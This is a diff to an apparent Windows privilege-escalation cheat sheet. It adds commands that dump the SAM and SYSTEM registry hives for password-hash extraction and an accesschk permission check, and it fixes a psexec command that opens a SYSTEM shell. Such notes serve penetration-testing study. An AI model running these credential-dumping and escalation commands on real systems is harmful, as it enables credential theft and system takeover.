@@ -237,6 +237,8 @@ Dangerous permissions: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
 
 RABBIT HOLE: Make sure you can restart the service or machine to make changes active!
 
+`accesschk.exe /accepteula -ucqv servicename`
+
 2. Unquoted Service Path
 
 ```cmd
@@ -295,7 +297,7 @@ Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
 
 # OR same with accesschk.exe
 
-.\accesschk.exe /accept eula -uvwqk HKLM\system\currentcontrolset\services\regsvc
+.\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
 
 # we see that NT AUTHORITY\INTERACTIVE has full control
 # all localy logged in users are part of the INTERACTIVE GROUP
@@ -478,6 +480,12 @@ If found then search in the directory for strings within files
 `findstr /si password *.xml *.ini *.txt`
 
 #### SAM/SYSTEM password hashes
+
+* dump SAM and SYSTEM to examine it with `samdump2`
+
+
+reg save HKLM\SAM c:\mimikatz_trunk\x64\SAM
+reg save HKLM\SYSTEM c:\mimikatz_trunk\x64\SYSTEM
 
 Look for backups in
 
@@ -712,7 +720,7 @@ i686-w64-mingw32-gcc shell.c -o shell.exe
 # Post exploitation
 
 * Once Admin privileges obtained get SYSTEM shell
-`psexec -accepteula -sid cmd.exe`
+`psexec.exe -accepteula -sid cmd.exe`
 
 Or connect as other service if needed from victim
 
